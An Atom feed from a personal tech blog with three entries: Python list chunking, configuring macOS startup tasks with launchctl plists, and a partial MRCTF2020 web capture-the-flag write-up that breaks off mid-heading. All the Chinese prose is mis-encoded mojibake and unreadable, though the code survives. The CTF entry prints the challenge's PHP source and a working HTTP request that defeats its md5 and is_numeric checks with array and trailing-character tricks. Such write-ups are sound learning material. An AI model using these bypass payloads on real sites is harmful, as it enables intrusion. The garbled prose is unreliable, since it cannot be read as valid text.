<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>xianyu123&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://0clickjacking0.github.io/"/>
  <updated>2020-06-02T12:02:21.830Z</updated>
  <id>http://0clickjacking0.github.io/</id>
  
  <author>
    <name>xianyu123</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>pythonå°†ä¸€ç»„æ•°åˆ†æˆæ¯å‡ ä¸ªä¸€ç»„çš„ä¸€äº›æ€è€ƒ</title>
    <link href="http://0clickjacking0.github.io/2020/06/02/python%E5%B0%86%E4%B8%80%E7%BB%84%E6%95%B0%E5%88%86%E6%88%90%E6%AF%8F%E5%87%A0%E4%B8%AA%E4%B8%80%E7%BB%84%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/"/>
    <id>http://0clickjacking0.github.io/2020/06/02/pythonå°†ä¸€ç»„æ•°åˆ†æˆæ¯å‡ ä¸ªä¸€ç»„çš„ä¸€äº›æ€è€ƒ/</id>
    <published>2020-06-02T11:54:18.000Z</published>
    <updated>2020-06-02T12:02:21.830Z</updated>
    
    <content type="html"><![CDATA[<p>pythonå°†ä¸€ç»„æ•°åˆ†æˆæ¯å‡ ä¸ªä¸€ç»„çš„ä¸€äº›æ€è€ƒ</p><a id="more"></a><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æœ€è¿‘ç”¨pythonå†™ä¸€ä¸ªçˆ¬è™«çš„æ—¶å€™ï¼Œçªç„¶é‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼šå¦‚ä½•å°†ä¸€ä¸ªlistä¸­çš„æ•°å­—ï¼Œåˆ†æˆæ¯å‡ ä¸ªä¸€ç»„ï¼Œä¾¿æœ‰äº†è¿™ç¯‡æ–‡ç« </p><h1 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h1><h2 id="æ–¹æ³•1"><a href="#æ–¹æ³•1" class="headerlink" title="æ–¹æ³•1"></a>æ–¹æ³•1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>]</span><br><span class="line">b = []</span><br><span class="line">step = <span class="number">6</span> <span class="comment"># è¿™é‡Œæ˜¯ä½ é€‰æ‹©çš„å‡ ä¸ªä¸€ç»„</span></span><br><span class="line">lens = math.ceil(len(a)/step)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,lens):</span><br><span class="line">    print(a[step*i:step*i+step])</span><br></pre></td></tr></table></figure><h2 id="æ–¹æ³•2"><a href="#æ–¹æ³•2" class="headerlink" title="æ–¹æ³•2"></a>æ–¹æ³•2</h2><p>å‚è€ƒè‡ª<a href="https://blog.csdn.net/Mr_Cat123/article/details/80584988" target="_blank" rel="noopener">pythonå°†ä¸€ç»„æ•°åˆ†æˆæ¯3ä¸ªä¸€ç»„</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>]</span><br><span class="line">step = <span class="number">3</span></span><br><span class="line">b = [a[i:i+step] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(a),step)]</span><br><span class="line">print(b)</span><br></pre></td></tr></table></figure><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>å…¶å®è¿™ä¸¤ç§æ–¹æ³•çš„æ€æƒ³éƒ½æ˜¯ä¸€æ ·çš„ï¼Œæœ¬è´¨ä¸Šå°±æ˜¯ç”¨åˆ‡ç‰‡å–å‡ºæƒ³è¦æ•°æ®çš„èŒƒå›´ï¼Œåªæ˜¯æ–¹æ³•1ç”¨äº†ä¸€ä¸ªå˜é‡çš„åŠ¨æ€èŒƒå›´ï¼Œæ–¹æ³•2ç”¨äº†<code>range()</code>å‡½æ•°çš„<code>step</code>å‚æ•°ï¼Œæ–¹æ³•2çœ‹èµ·æ¥æ›´åŠ ç®€æ´æ˜äº†</p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><ol><li><a href="https://blog.csdn.net/Mr_Cat123/article/details/80584988" target="_blank" rel="noopener">pythonå°†ä¸€ç»„æ•°åˆ†æˆæ¯3ä¸ªä¸€ç»„</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;pythonå°†ä¸€ç»„æ•°åˆ†æˆæ¯å‡ ä¸ªä¸€ç»„çš„ä¸€äº›æ€è€ƒ&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>macosè®¾ç½®å¼€æœºå¯åŠ¨ä»»åŠ¡</title>
    <link href="http://0clickjacking0.github.io/2020/05/20/macos%E8%AE%BE%E7%BD%AE%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8%E4%BB%BB%E5%8A%A1/"/>
    <id>http://0clickjacking0.github.io/2020/05/20/macosè®¾ç½®å¼€æœºå¯åŠ¨ä»»åŠ¡/</id>
    <published>2020-05-20T01:57:15.000Z</published>
    <updated>2020-05-20T06:07:48.468Z</updated>
    
    <content type="html"><![CDATA[<p>macosè®¾ç½®å¼€æœºå¯åŠ¨ä»»åŠ¡</p><a id="more"></a><h1 id="æ–¹æ³•1â€”â€”ç³»ç»Ÿåå¥½è®¾ç½®"><a href="#æ–¹æ³•1â€”â€”ç³»ç»Ÿåå¥½è®¾ç½®" class="headerlink" title="æ–¹æ³•1â€”â€”ç³»ç»Ÿåå¥½è®¾ç½®"></a>æ–¹æ³•1â€”â€”ç³»ç»Ÿåå¥½è®¾ç½®</h1><p>è¿›å…¥ç³»ç»Ÿåå¥½è®¾ç½®-&gt;å¸æˆ·-&gt;ç™»é™†é¡¹</p><p>è¿™ä¸ªå°±å…ˆä¸è®²äº†ï¼Œä½“éªŒæ„Ÿæœ‰ç‚¹å·®</p><h1 id="æ–¹æ³•2â€”â€”launchctl"><a href="#æ–¹æ³•2â€”â€”launchctl" class="headerlink" title="æ–¹æ³•2â€”â€”launchctl"></a>æ–¹æ³•2â€”â€”launchctl</h1><p>launchctlæ˜¯ä¸€ä¸ªç»Ÿä¸€çš„æœåŠ¡ç®¡ç†æ¡†æ¶ï¼Œå¯åŠ¨ã€åœæ­¢å’Œç®¡ç†å®ˆæŠ¤è¿›ç¨‹ã€åº”ç”¨ç¨‹åºã€è¿›ç¨‹å’Œè„šæœ¬ã€‚ä¸‹é¢è®²è¿°ä¸€ä¸‹å¦‚ä½•åœ¨Macä¸Šä½¿ç”¨launchctlæ‰§è¡Œå®šæ—¶ä»»åŠ¡ã€‚</p><h2 id="1-plistçš„ä½œç”¨"><a href="#1-plistçš„ä½œç”¨" class="headerlink" title="1. plistçš„ä½œç”¨"></a>1. plistçš„ä½œç”¨</h2><p>launchctl å°†æ ¹æ®plistæ–‡ä»¶çš„ä¿¡æ¯æ¥å¯åŠ¨ä»»åŠ¡ã€‚<br> plistè„šæœ¬ä¸€èˆ¬å­˜æ”¾åœ¨ä»¥ä¸‹ç›®å½•ï¼š</p><ul><li><code>/Library/LaunchDaemons</code>  â€“&gt;åªè¦ç³»ç»Ÿå¯åŠ¨äº†ï¼Œå“ªæ€•ç”¨æˆ·ä¸ç™»é™†ç³»ç»Ÿä¹Ÿä¼šè¢«æ‰§è¡Œ</li><li><code>/Library/LaunchAgents</code>  â€“&gt;å½“ç”¨æˆ·ç™»é™†ç³»ç»Ÿåæ‰ä¼šè¢«æ‰§è¡Œ</li></ul><p>æ›´å¤šçš„plistå­˜æ”¾ç›®å½•ï¼š</p><blockquote><p>~/Library/LaunchAgents ç”±ç”¨æˆ·è‡ªå·±å®šä¹‰çš„ä»»åŠ¡é¡¹<br> /Library/LaunchAgents ç”±ç®¡ç†å‘˜ä¸ºç”¨æˆ·å®šä¹‰çš„ä»»åŠ¡é¡¹<br> /Library/LaunchDaemons ç”±ç®¡ç†å‘˜å®šä¹‰çš„å®ˆæŠ¤è¿›ç¨‹ä»»åŠ¡é¡¹<br> /System/Library/LaunchAgents ç”±Mac OS Xä¸ºç”¨æˆ·å®šä¹‰çš„ä»»åŠ¡é¡¹<br> /System/Library/LaunchDaemons ç”±Mac OS Xå®šä¹‰çš„å®ˆæŠ¤è¿›ç¨‹ä»»åŠ¡é¡¹</p></blockquote><p>plistæ–‡ä»¶ç¤ºä¾‹ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE plist PUBLIC -//Apple Computer//DTD PLIST 1.0//EN</span></span><br><span class="line"><span class="meta">http://www.apple.com/DTDs/PropertyList-1.0.dtd &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plist</span> <span class="attr">version</span>=<span class="string">"1.0"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dict</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>Label<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>com.example.exampled<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>ProgramArguments<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">array</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">string</span>&gt;</span>exampled<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>KeepAlive<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>RunAtLoad<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dict</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plist</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¯¹äºä¸Šé¢plistæ–‡ä»¶éƒ¨åˆ†é”®å€¼è¯´æ˜ï¼š</p><p><strong>Label (å¿…é¡»)</strong></p><p>è¯¥é¡¹æœåŠ¡çš„åç§°ï¼Œä¸”æ–‡ä»¶åå¿…é¡»å’ŒLabelä¸€è‡´ï¼Œæ¯”å¦‚ä¸Šè¿°çš„plistæ–‡ä»¶ï¼Œæ–‡ä»¶åå°±å«<code>com.example.exampled.plist</code></p><p><strong>ProgramArguments</strong></p><p>æŒ‡å®šå¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„åŠå…¶å‚æ•°ï¼Œæ¯”å¦‚æ‰§è¡Œ<code>ls -a</code>ï¼Œå¯¹åº”åˆ°è¯¥é…ç½®ä¸­ï¼Œåº”è¯¥å†™ä½œï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">key</span>&gt;</span>ProgramArguments<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">array</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">string</span>&gt;</span>ls<span class="tag">&lt;/<span class="name">string</span>&gt;</span>         </span><br><span class="line">     <span class="tag">&lt;<span class="name">string</span>&gt;</span>-a<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>RunAtLoad (å¯é€‰)</strong></p><p>æ ‡è¯†launchdåœ¨åŠ è½½å®Œè¯¥é¡¹æœåŠ¡ä¹‹åç«‹å³å¯åŠ¨è·¯å¾„æŒ‡å®šçš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚é»˜è®¤å€¼ä¸º false,è®¾ç½®ä¸º true å³å¯å®ç°å¼€æœºè¿è¡Œè„šæœ¬æ–‡ä»¶ã€‚</p><p><strong>StartCalendarInterval</strong> (å¯é€‰)</p><p>è¯¥å…³é”®å­—å¯ä»¥ç”¨æ¥è®¾ç½®å®šæ—¶æ‰§è¡Œå¯æ‰§è¡Œç¨‹åºï¼Œå¯ä½¿ç”¨ Month, Day, Hour, Minute, Secondç­‰å­å…³é”®å­—ï¼Œå®ƒå¯ä»¥æŒ‡å®šè„šæœ¬åœ¨å¤šå°‘æœˆï¼Œå¤©ï¼Œå°æ—¶ï¼Œåˆ†é’Ÿï¼Œç§’ï¼Œæ˜ŸæœŸå‡ ç­‰æ—¶é—´ä¸Šæ‰§è¡Œï¼Œè‹¥ç¼ºå°‘æŸä¸ªå…³é”®å­—åˆ™è¡¨ç¤ºä»»æ„è¯¥æ—¶é—´ç‚¹ï¼Œç±»ä¼¼äº Unix çš„ Crontab è®¡åˆ’ä»»åŠ¡çš„è®¾ç½®æ–¹å¼ï¼Œæ¯”å¦‚åœ¨è¯¥ä¾‹å­ä¸­è®¾ç½®ä¸ºæ¯å°æ—¶çš„20åˆ†çš„æ—¶å€™æ‰§è¡Œè¯¥å‘½ä»¤ã€‚</p><p><strong>KeepAlive</strong>ï¼ˆå¯é€‰ï¼‰</p><p>æ˜¯å¦ä¿æŒæŒç»­è¿è¡Œ</p><p>æ‰€æœ‰keyå…³é”®å­—è¯¦ç»†ä½¿ç”¨è¯´æ˜å¯ä»¥åœ¨Mac OS Xç»ˆç«¯ä¸‹ä½¿ç”¨å‘½ä»¤<code>man launchd.plist</code>æŸ¥è¯¢</p><p>æ›´å¤šè¯·å‚è€ƒï¼š<a href="https://www.manpagez.com/man/5/launchd.plist/" target="_blank" rel="noopener">https://www.manpagez.com/man/5/launchd.plist/</a></p><h3 id="launchctlçš„ä¸€äº›å¸¸ç”¨çš„å‘½ä»¤"><a href="#launchctlçš„ä¸€äº›å¸¸ç”¨çš„å‘½ä»¤" class="headerlink" title="launchctlçš„ä¸€äº›å¸¸ç”¨çš„å‘½ä»¤"></a>launchctlçš„ä¸€äº›å¸¸ç”¨çš„å‘½ä»¤</h3><p>æ£€æµ‹plistæ–‡ä»¶è¯­æ³•æ˜¯å¦æœ‰é”™è¯¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plutil local.localhost.startup.plist</span><br></pre></td></tr></table></figure><h4 id="æ³¨ï¼šä»¥ä¸‹æœåŠ¡å¦‚æœéœ€è¦ç”¨sudoæ‰èƒ½å¯åŠ¨çš„ï¼Œéœ€è¦åœ¨å‘½ä»¤å‰åŠ å…¥sudo"><a href="#æ³¨ï¼šä»¥ä¸‹æœåŠ¡å¦‚æœéœ€è¦ç”¨sudoæ‰èƒ½å¯åŠ¨çš„ï¼Œéœ€è¦åœ¨å‘½ä»¤å‰åŠ å…¥sudo" class="headerlink" title="æ³¨ï¼šä»¥ä¸‹æœåŠ¡å¦‚æœéœ€è¦ç”¨sudoæ‰èƒ½å¯åŠ¨çš„ï¼Œéœ€è¦åœ¨å‘½ä»¤å‰åŠ å…¥sudo"></a>æ³¨ï¼šä»¥ä¸‹æœåŠ¡å¦‚æœéœ€è¦ç”¨sudoæ‰èƒ½å¯åŠ¨çš„ï¼Œéœ€è¦åœ¨å‘½ä»¤å‰åŠ å…¥sudo</h4><p>è½½å…¥é…ç½®, ä½¿é…ç½®ç”Ÿæ•ˆ</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># åŠ è½½å¯åŠ¨ä»»åŠ¡</span><br><span class="line">launchctl load ~<span class="regexp">/Library/</span>LaunchAgents/example.plist</span><br><span class="line"></span><br><span class="line"># åŠ è½½ä»»åŠ¡, -wé€‰é¡¹ä¼šåœ¨ä¸‹æ¬¡ç™»å½•/é‡æ–°å¯åŠ¨æ—¶é‡æ–°å¯åŠ¨ã€‚</span><br><span class="line">launchctl load -w ~<span class="regexp">/Library/</span>LaunchAgents/example.plist</span><br></pre></td></tr></table></figure><p>åœæ­¢æœåŠ¡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo launchctl stop &lt;path&gt;</span><br></pre></td></tr></table></figure><p>å¼€å§‹æœåŠ¡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo launchctl start &lt;path&gt;</span><br></pre></td></tr></table></figure><p>killæœåŠ¡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo launchctl kill &lt;path&gt;</span><br></pre></td></tr></table></figure><p>å¸è½½ä»»åŠ¡</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># åœæ­¢å¹¶å¸è½½ä»»åŠ¡ã€‚ä¸‹æ¬¡ç™»å½•/é‡æ–°å¯åŠ¨æ—¶ï¼Œä»»åŠ¡ä»å°†é‡æ–°å¯åŠ¨ã€‚</span><br><span class="line">launchctl unload ~<span class="regexp">/Library/</span>LaunchAgents/example.plist</span><br><span class="line"></span><br><span class="line"># è¯¥ä»»åŠ¡å°†ä¸ä¼šåœ¨ä¸‹æ¬¡ç™»å½•/é‡æ–°å¯åŠ¨æ—¶é‡æ–°å¯åŠ¨ã€‚</span><br><span class="line">launchctl unload -w ~<span class="regexp">/Library/</span>LaunchAgents/example.plist</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹æœåŠ¡è¿è¡ŒçŠ¶æ€</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">launchctl <span class="built_in">list</span></span><br><span class="line">sudo launchctl <span class="built_in">list</span>ï¼ˆæœ‰æ—¶å€™ä¸€äº›éœ€è¦ç”¨sudoæ‰èƒ½æ‰§è¡Œçš„æœåŠ¡å°±éœ€è¦ç”¨sudoæ‰èƒ½æŸ¥çœ‹ï¼‰</span><br></pre></td></tr></table></figure><p>è¾“å‡ºå…·æœ‰ä»¥ä¸‹å«ä¹‰ï¼š</p><p>ç¬¬ä¸€ä¸ªæ•°å­—æ˜¯è¿›ç¨‹çš„PIDï¼Œå¦‚æœå®ƒæ­£åœ¨è¿è¡Œï¼Œå¦‚æœå®ƒä¸è¿è¡Œï¼Œå®ƒæ˜¾ç¤ºä¸€ä¸ªâ€™ - â€˜ã€‚<br>ç¬¬äºŒä¸ªæ•°å­—æ˜¯è¿›ç¨‹çš„é€€å‡ºä»£ç ï¼ˆå¦‚æœå®ƒå·²ç»å®Œæˆï¼‰ã€‚å¦‚æœæ˜¯è´Ÿæ•°ï¼Œåˆ™æ˜¯æ€æ­»ä¿¡å·çš„æ•°é‡ã€‚<br>ç¬¬ä¸‰åˆ—æ˜¯è¿›ç¨‹åç§°ã€‚</p><p>ä¸‹é¢è¿™ä¸ªå°±è¯´æ˜å¼€æœºå¯åŠ¨nginxæœåŠ¡å·²ç»æˆåŠŸäº†</p><p>æ³¨æ„ï¼šæ‰§è¡Œ<code>launchctl</code>å‘½ä»¤åŠ <code>sudo</code>ä¸ä¸åŠ ç»“æœæ˜¯å®Œå…¨ä¸åŒçš„ã€‚</p><p><img src="http://images.xianyu123.club/20200520134958.png" alt="image-20200520134953097"></p><h2 id="2-å…ˆç”¨nginxä¸¾ä¸ªğŸŒ°"><a href="#2-å…ˆç”¨nginxä¸¾ä¸ªğŸŒ°" class="headerlink" title="2. å…ˆç”¨nginxä¸¾ä¸ªğŸŒ°"></a>2. å…ˆç”¨nginxä¸¾ä¸ªğŸŒ°</h2><p>å¦‚æœä½ æ˜¯ç”¨<code>homebrew</code>å®‰è£…çš„<code>nginx</code>ï¼Œè®¿é—®<code>/usr/local/opt/nginx</code>ï¼Œä¼šå‘ç°è¯¥ç›®å½•ä¸‹æœ‰ä¸€ä¸ªæ–‡ä»¶<code>homebrew.mxcl.nginx.plist</code>ï¼Œè¿™ä¸ªå°±æ˜¯å¼€æœºè‡ªå¯åŠ¨çš„é…ç½®æ–‡ä»¶ï¼Œæˆ‘ä»¬åªéœ€è¦æŠŠå®ƒå¤åˆ¶åˆ°<code>/Library/LaunchDaemons</code>ç›®å½•ä¸‹å³å¯</p><p>ç„¶åå¯åŠ¨å®ƒå°±å¥½äº†</p><h2 id="3-æ‹“å±•"><a href="#3-æ‹“å±•" class="headerlink" title="3. æ‹“å±•"></a>3. æ‹“å±•</h2><p>è¿™é‡Œæˆ‘æƒ³åˆ°äº†ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯åœ¨macä¸Šæˆ‘é‡åˆ°è¿‡ä¸€äº›è½¯ä»¶ä¼šè«åå…¶å¦™å¼€æœºè‡ªå¯åŠ¨ï¼Œä½†æ˜¯åœ¨è½¯ä»¶çš„è®¾ç½®åœ°æ–¹åˆæ‰¾ä¸åˆ°å–æ¶ˆå¼€æœºè‡ªå¯åŠ¨çš„é€‰é¡¹ï¼Œè¿™æ ·çš„è¯æˆ‘ä»¬å¯ä»¥å°è¯•åˆ é™¤è¿™é‡Œçš„plistæ–‡ä»¶ï¼ˆè¿™åªæ˜¯æˆ‘çš„ä¸€ä¸ªè®¾æƒ³ï¼Œè¿˜æ²¡æœ‰å®è·µè¿‡ğŸ˜‚ï¼Œé€ƒ23333ï¼‰</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://www.jianshu.com/p/4addd9b455f2" target="_blank" rel="noopener">Macä¸­çš„å®šæ—¶ä»»åŠ¡åˆ©å™¨ï¼šlaunchctl</a></li><li><a href="https://blog.csdn.net/testcs_dn/article/details/80060551" target="_blank" rel="noopener">macç³»ç»Ÿï¼Œphp-fpmåŠ å…¥å¼€æœºå¯åŠ¨é¡¹</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;macosè®¾ç½®å¼€æœºå¯åŠ¨ä»»åŠ¡&lt;/p&gt;
    
    </summary>
    
      <category term="mac" scheme="http://0clickjacking0.github.io/categories/mac/"/>
    
    
  </entry>
  
  <entry>
    <title>MRCTF2020_web(éƒ¨åˆ†)</title>
    <link href="http://0clickjacking0.github.io/2020/03/29/MRCTF2020-web-%E9%83%A8%E5%88%86/"/>
    <id>http://0clickjacking0.github.io/2020/03/29/MRCTF2020-web-éƒ¨åˆ†/</id>
    <published>2020-03-29T14:24:34.000Z</published>
    <updated>2020-03-29T14:25:42.918Z</updated>
    
    <content type="html"><![CDATA[<p>MRCTF2020_web(éƒ¨åˆ†)</p><a id="more"></a><h2 id="ez-bypass"><a href="#ez-bypass" class="headerlink" title="ez_bypass"></a>ez_bypass</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">$flag=<span class="string">'MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'gg'</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>])) &#123;</span><br><span class="line">    $id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">    $gg=$_GET[<span class="string">'gg'</span>];</span><br><span class="line">    <span class="keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'You got the first step'</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>])) &#123;</span><br><span class="line">            $passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line">            <span class="keyword">if</span> (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 <span class="keyword">if</span>($passwd==<span class="number">1234567</span>)</span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">'Good Job!'</span>;</span><br><span class="line">                     highlight_file(<span class="string">'flag.php'</span>);</span><br><span class="line">                     <span class="keyword">die</span>(<span class="string">'By Retr_0'</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">"can you think twice??"</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'You can not get it !'</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'only one way to get the flag'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"You are not a real hacker!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Please input first'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;Please input first</span><br></pre></td></tr></table></figure><p>å‘åŒ…</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?id[]=123&amp;gg[]=1</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 15a18ed6-9754-4708-9a84-7e5fbf71561f.merak-ctf.site</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 16</span><br><span class="line"></span><br><span class="line">passwd=1234567\n</span><br></pre></td></tr></table></figure><h2 id="ä½ ä¼ ä½ ğŸå‘¢"><a href="#ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="ä½ ä¼ ä½ ğŸå‘¢"></a>ä½ ä¼ ä½ 